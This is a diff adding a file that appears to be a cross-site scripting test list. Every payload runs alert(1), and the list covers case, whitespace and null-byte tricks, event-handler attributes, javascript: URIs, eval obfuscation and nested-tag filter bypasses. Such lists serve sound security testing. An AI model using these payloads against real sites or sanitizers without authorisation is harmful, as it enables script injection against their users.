@@ -1,0 +1,80 @@
+<script>alert(1)</script>
+
+<script >alert(1)</script>
+<script	    >alert(1)</script>
+
+<script&#9>alert(1)</script>
+<script&#10>alert(1)</script>
+<script&#13>alert(1)</script>
+
+<ScRipT>alert(1)</sCriPt>
+
+<%00script>alert(1)</script>
+<script>al%00ert(1)</script>
+
+<randomtag type="text" name="input" value="><script>alert(1)</script>
+
+input/type="text" name="input" value="><script>alert(1)</script>
+<input&#9type="text" name="input" value="><script>alert(1)</script>
+<input&#10type="text" name="input" value="><script>alert(1)</script>
+<input&#13type="text" name="input" value="><script>alert(1)</script>
+<input/'type="text" name="input" value="><script>alert(1)</script>
+
+<iNpUt type="text" name="input" value="><script>alert(1)</script>
+
+<%00input type="text" name="input" value="><script>alert(1)</script>
+<inp%00ut type="text" name="input" value="><script>alert(1)</script>
+
+<input t%00ype="text" name="input" value="><script>alert(1)</script>
+<input type="text" name="input" value="><script>a%00lert(1)</script>
+
+<audio src="new.mp3" onerror=alert(1)>
+<video src="new.mp4" onerror=alert(1)>
+<svg width="200" height="100" onload=alert(1)>
+
+<input onsubmit=alert(1)>
+
+<object onerror=alert(1)>
+<body onactivate=alert(1)>
+<body onfocusin=alert(1)>
+<script onreadystatechange=alert(1)>
+<input autofocus onfocus=alert(1)>
+
+<img onerror="alert(1)"src=x>
+<img onerror='alert(1)'src=x>
+
+<img onerror=&#34alert(1)&#34src=x>
+<img onerror=&#39alert(1)&#39src=x>
+
+<img onerror=&#34alert(1)&#34src=x>
+<img onerror=&#39alert(1)&#39src=x>
+
+<img onerror=&#96alert(1)&#96src=x>
+
+<img src=`x`onerror=alert(1)>
+
+<<script>alert(1)//<</script>
+
+<input onsubmit=alert(1)<
+
+<a href="javascript:alert(1)">Click Here</a>
+
+<img src=javascript:alert(1)>
+<form action=javascript:alert(1)>
+<object data=javascript:alert(1)>
+<button formaction=javascript:alert(1)>
+<video src=javascript:alert(1)>
+
+eval('1 + 1')
+
+<script>eval('a\u006cert(1)')</script>
+
+<script>eval('al' + 'ert(1)')</script>
+
+<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>
+
+<meta http-equiv="refresh" content="0;url=javascript:alert(1);">
+
+<script><script>alert(1)</script>
+
+<sc<script>ript>alert(1)</script>
